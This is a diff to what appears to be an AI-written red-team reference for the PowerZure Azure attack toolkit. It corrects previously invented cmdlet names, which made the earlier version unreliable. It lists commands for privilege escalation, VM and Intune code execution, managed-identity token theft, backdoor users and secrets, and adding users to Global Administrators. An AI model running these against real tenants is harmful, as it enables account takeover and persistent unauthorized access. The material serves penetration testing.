@@ -15,7 +15,7 @@ Install-Module Az -Scope CurrentUser
 Connect-AzAccount
 ```
 
-> [!warning] **Verified against `PowerZure.psm1` (2026-08) — the whole `Get-Az*`/`New-Az*` vocabulary older guides use is WRONG.** PowerZure functions are all `*-Azure*` (e.g. `Get-AzureTarget`, `Get-AzureUser`, `Add-AzureRole`, `Invoke-AzureRunCommand`). The `Get-Az*` names actually belong to **Microsoft's official Az module** — calling them runs a different Microsoft cmdlet (or nothing), not PowerZure. Everything below is the real function set; list it with `Invoke-PowerZure -h` or `Get-Command -Module PowerZure`.
+> [!warning] **Verified against `PowerZure.psm1` (2026-08) — the whole `Get-Az*`/`New-Az*` vocabulary older guides use is WRONG.** PowerZure functions are all `*-Azure*` (e.g. `Get-AzureTarget`, `Get-AzureUser`, `Add-AzureRole`, `Invoke-AzureRunCommand`). The `Get-Az*` names actually belong to **Microsoft's official Az module** — calling them runs a different Microsoft cmdlet (or nothing), not PowerZure. List it with `Invoke-PowerZure -h` or `Get-Command -Module PowerZure`. **Re-verified 2026-09-27 against the repo docs (`docs/Functions/operational.rst` + `infogathering.rst`)** — which caught four more invented names in the persistence section: `New-AzureADUser`→`New-AzureUser`, `Add-AzureADSPSecret`→`Add-AzureSPSecret`, and `Invoke-AzureMIBackdoor` / `Add-AzureADRole` (neither exists).
 
 > [!note] **PowerZure vs MicroBurst** — Similar scope, different strengths. PowerZure has a more structured workflow and covers more Entra ID attack paths. MicroBurst has broader one-shot credential harvesting (`Get-AzPasswords`). Run both on Azure engagements.
 
@@ -98,8 +98,10 @@ Add-AzureRole -Role "Owner" -Username <upn> -Scope "/subscriptions/<sub-id>"
 # VM code execution (needs VM Contributor+) — several delivery methods:
 Invoke-AzureRunCommand -VMName <name> -Command 'whoami /all'
 Invoke-AzureRunProgram -VMName <name> -Command '...'          # run an uploaded program
+Invoke-AzureRunMSBuild -VMName <name> -File '...'             # MSBuild inline-task exec
 Invoke-AzureCustomScriptExtension -VMName <name> -Command '...'
 Invoke-AzureVMUserDataCommand -VMName <name> -Command '...'   # via user-data agent
+New-AzureIntuneScript -Script '...'                          # push a script to Intune-managed devices
 
 # Managed-identity token from inside a VM (run on the target VM)
 curl -H "Metadata:true" \
@@ -113,16 +115,17 @@ curl -H "Metadata:true" \
 ```powershell
 # Backdoor: create a new user or service principal with a role
 New-AzureBackdoor -Username backdoor -Password 'P@ssw0rd123!'
-Invoke-AzureMIBackdoor                        # abuse a managed identity for persistence
 
 # New Entra user / add secret to an existing app registration (persistent app auth)
-New-AzureADUser -Username backdoor@company.com -Password 'P@ssw0rd123!'
-Add-AzureADSPSecret -AppName <name>           # or -AppID <app-id>
+# (real names have NO "AD" infix — New-AzureADUser / Add-AzureADSPSecret do not exist)
+New-AzureUser -Username backdoor@company.com -Password 'P@ssw0rd123!'
+Add-AzureSPSecret -AppName <name>             # or -AppID <app-id>
 
-# Add to a privileged group / grant an Entra role / reset a password
+# Add to a privileged group / reset a password
 Add-AzureGroupMember -Group "Global Administrators" -Username <upn>
-Add-AzureADRole -Role "Global Administrator" -Username <upn>
 Set-AzureUserPassword -Username <upn> -Password 'NewPass123!'
+# NOTE: PowerZure has no directory-role-add cmdlet ("Add-AzureADRole" was invented).
+# Grant an Entra role via AADInternals or MS Graph; PowerZure covers Azure RBAC via Add-AzureRole.
 
 # Run arbitrary commands via a rogue Automation runbook
 Invoke-AzureCommandRunbook -Command 'whoami'
@@ -135,5 +138,5 @@ Invoke-AzureCommandRunbook -Command 'whoami'
 ---
 
 *Created: 2026-03-06*
-*Updated: 2026-08-27*
-*Model: claude-opus-5*
+*Updated: 2026-09-27*
+*Model: claude-opus-4-8*
